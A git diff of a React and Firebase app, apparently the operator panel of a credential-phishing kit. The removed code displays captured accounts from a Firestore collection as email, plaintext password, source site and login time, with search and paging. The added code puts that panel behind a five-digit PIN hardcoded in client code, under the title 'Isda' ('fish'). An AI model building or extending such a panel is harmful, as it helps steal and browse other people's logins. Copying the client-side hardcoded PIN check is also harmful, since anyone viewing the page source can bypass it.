@@ -1,124 +1,66 @@
-import { useEffect, useState } from "react";
-import { db } from "../utils/firebase";
-import { collection, onSnapshot, query, orderBy } from "firebase/firestore";
+import { useState } from "react";
+import AdminPage from "./admin/AdminPage";
 
-export default function AdminPage() {
-  const [users, setUsers] = useState([]);
-  const [search, setSearch] = useState("");
-  const [filteredUsers, setFilteredUsers] = useState([]);
-  const [currentPage, setCurrentPage] = useState(1);
-  const [usersPerPage] = useState(5); // Change this to adjust items per page
+export default function App() {
+  const [pin, setPin] = useState(Array(5).fill("")); // Array to store 5 digits
+  const [isLoggedIn, setIsLoggedIn] = useState(false);
+  const correctPin = "04120"; // Set a hardcoded PIN for this example
 
-  useEffect(() => {
-    // Real-time listener for Firestore
-    const usersRef = collection(db, "accounts");
-    const q = query(usersRef, orderBy("loginAt", "desc"));
+  const handleChange = (value, index) => {
+    if (isNaN(value) || value.length > 1) return; // Ensure only single digits
+    const newPin = [...pin];
+    newPin[index] = value;
+    setPin(newPin);
 
-    const unsubscribe = onSnapshot(q, (snapshot) => {
-      const userData = snapshot.docs.map((doc) => ({
-        id: doc.id,
-        ...doc.data(),
-        loginAt: doc.data().loginAt?.toDate()?.toLocaleString() || "N/A",
-      }));
-      setUsers(userData);
-      setFilteredUsers(userData); // Initialize with all users
-    });
-
-    return () => unsubscribe(); // Cleanup listener on component unmount
-  }, []);
-
-  // Handle search input
-  const handleSearch = (e) => {
-    const value = e.target.value.toLowerCase();
-    setSearch(value);
-    const filtered = users.filter(
-      (user) =>
-        user.email.toLowerCase().includes(value) ||
-        user.site.toLowerCase().includes(value)
-    );
-    setFilteredUsers(filtered);
-    setCurrentPage(1); // Reset to the first page when searching
+    // Automatically focus the next input field
+    if (value && index < 4) {
+      document.getElementById(`pin-${index + 1}`).focus();
+    }
   };
 
-  // Pagination calculations
-  const indexOfLastUser = currentPage * usersPerPage;
-  const indexOfFirstUser = indexOfLastUser - usersPerPage;
-  const currentUsers = filteredUsers.slice(indexOfFirstUser, indexOfLastUser);
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (pin.join("") === correctPin) {
+      setIsLoggedIn(true);
+    } else {
+      alert("Incorrect PIN. Please try again.");
+      setPin(Array(5).fill("")); // Reset the PIN
+    }
+  };
 
-  const totalPages = Math.ceil(filteredUsers.length / usersPerPage);
-
-  const handlePageChange = (page) => {
-    if (page > 0 && page <= totalPages) {
-      setCurrentPage(page);
+  const handleKeyDown = (e, index) => {
+    if (e.key === "Backspace" && !pin[index] && index > 0) {
+      // Focus the previous input if current is empty and Backspace is pressed
+      document.getElementById(`pin-${index - 1}`).focus();
     }
   };
 
   return (
     <div style={styles.container}>
-      <h1 style={styles.heading}>Admin Dashboard</h1>
-      <div style={styles.searchContainer}>
-        <input
-          type="text"
-          placeholder="Search by email or site..."
-          value={search}
-          onChange={handleSearch}
-          style={styles.searchBar}
-        />
-      </div>
-      <div style={styles.tableWrapper}>
-        <table style={styles.table}>
-          <thead>
-            <tr>
-              <th style={styles.th}>Email</th>
-              <th style={styles.th}>Password</th>
-              <th style={styles.th}>Site</th>
-              <th style={styles.th}>Login At</th>
-            </tr>
-          </thead>
-          <tbody>
-            {currentUsers.map((user) => (
-              <tr key={user.id}>
-                <td style={styles.td}>{user.email}</td>
-                <td style={styles.td}>{user.password}</td>
-                <td style={styles.td}>{user.site}</td>
-                <td style={styles.td}>{user.loginAt}</td>
-              </tr>
+      {isLoggedIn ? (
+        <AdminPage />
+      ) : (
+        <form onSubmit={handleSubmit} style={styles.form}>
+          <h1 style={styles.heading}>Isda</h1>
+          <div style={styles.pinContainer}>
+            {pin.map((digit, index) => (
+              <input
+                key={index}
+                id={`pin-${index}`}
+                type="text"
+                maxLength="1"
+                value={digit}
+                onChange={(e) => handleChange(e.target.value, index)}
+                onKeyDown={(e) => handleKeyDown(e, index)}
+                style={styles.pinInput}
+              />
             ))}
-          </tbody>
-        </table>
-        {currentUsers.length === 0 && (
-          <p style={styles.noDataText}>No results found.</p>
-        )}
-      </div>
-      <div style={styles.pagination}>
-        <button
-          onClick={() => handlePageChange(currentPage - 1)}
-          disabled={currentPage === 1}
-          style={styles.paginationButton}
-        >
-          Previous
-        </button>
-        {Array.from({ length: totalPages }, (_, i) => (
-          <button
-            key={i + 1}
-            onClick={() => handlePageChange(i + 1)}
-            style={{
-              ...styles.paginationButton,
-              backgroundColor: currentPage === i + 1 ? "#333" : "#fff",
-              color: currentPage === i + 1 ? "#fff" : "#333",
-            }}
-          >
-            {i + 1}
+          </div>
+          <button type="submit" style={styles.button}>
+            Submit
           </button>
-        ))}
-        <button
-          onClick={() => handlePageChange(currentPage + 1)}
-          disabled={currentPage === totalPages}
-          style={styles.paginationButton}
-        >
-          Next
-        </button>
-      </div>
+        </form>
+      )}
     </div>
   );
 }
@@ -126,81 +68,52 @@ export default function AdminPage() {
 // Styles
 const styles = {
   container: {
-    margin: "20px auto",
-    padding: "20px",
-    fontFamily: "'Roboto', sans-serif",
-    maxWidth: "900px",
-    color: "#333",
-    backgroundColor: "#f9f9f9",
-    borderRadius: "8px",
-    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
-  },
-  heading: {
-    textAlign: "center",
-    fontSize: "28px",
-    fontWeight: "bold",
-    color: "#333",
-    marginBottom: "20px",
-  },
-  searchContainer: {
-    textAlign: "center",
-    marginBottom: "20px",
-  },
-  searchBar: {
-    width: "80%",
-    padding: "12px 15px",
-    fontSize: "16px",
-    borderRadius: "8px",
-    border: "1px solid #ddd",
-    outline: "none",
-    transition: "border-color 0.3s ease",
-  },
-  tableWrapper: {
-    overflowX: "auto",
-  },
-  table: {
-    width: "100%",
-    borderCollapse: "collapse",
-    backgroundColor: "#fff",
-    borderRadius: "8px",
-    overflow: "hidden",
-    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
-  },
-  th: {
-    backgroundColor: "#333",
-    color: "#fff",
-    textAlign: "left",
-    padding: "12px 15px",
-    fontWeight: "bold",
-    fontSize: "16px",
-    borderBottom: "1px solid #ddd",
-  },
-  td: {
-    padding: "12px 15px",
-    fontSize: "15px",
-    borderBottom: "1px solid #ddd",
-    textAlign: "left",
-  },
-  pagination: {
     display: "flex",
     justifyContent: "center",
     alignItems: "center",
-    gap: "10px",
-    marginTop: "20px",
+    height: "100vh",
+    backgroundColor: "#f0f2f5",
+    fontFamily: "'Arial', sans-serif",
   },
-  paginationButton: {
-    padding: "8px 12px",
-    fontSize: "14px",
-    borderRadius: "5px",
-    border: "1px solid #ddd",
+  form: {
     backgroundColor: "#fff",
+    padding: "30px",
+    borderRadius: "10px",
+    boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
+    textAlign: "center",
+    width: "300px",
+  },
+  heading: {
+    marginBottom: "20px",
+    fontSize: "24px",
+    color: "#333",
+  },
+  pinContainer: {
+    display: "flex",
+    justifyContent: "center",
+    gap: "10px",
+    marginBottom: "20px",
+  },
+  pinInput: {
+    width: "50px",
+    height: "50px",
+    textAlign: "center",
+    fontSize: "24px",
+    border: "1px solid #ccc",
+    borderRadius: "5px",
+    boxShadow: "inset 0 1px 3px rgba(0, 0, 0, 0.1)",
+  },
+  button: {
+    padding: "10px 20px",
+    backgroundColor: "#007bff",
+    color: "#fff",
+    border: "none",
+    borderRadius: "5px",
     cursor: "pointer",
+    fontSize: "16px",
     transition: "background-color 0.3s ease",
   },
-  noDataText: {
-    textAlign: "center",
-    fontSize: "16px",
-    color: "#666",
-    marginTop: "20px",
+  buttonHover: {
+    backgroundColor: "#0056b3",
   },
 };
